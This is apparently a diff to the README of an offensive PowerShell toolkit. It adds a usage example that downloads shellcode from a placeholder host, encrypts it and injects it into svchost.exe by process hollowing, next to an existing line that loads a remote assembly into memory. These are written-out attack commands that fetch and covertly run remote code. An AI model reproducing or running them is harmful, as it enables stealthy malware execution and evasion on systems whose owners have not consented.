@@ -8,6 +8,11 @@ $a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolki
 Import-Module -Assembly $a
 ```
 
+```
+$r = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
+Invoke-ProcessHollow -procName 'svchost.exe' -k $r.encryptedKey -encsh $r.encryptedshellcode -ivk $.initVector
+```
+
 ## List of cmdlets
 
 
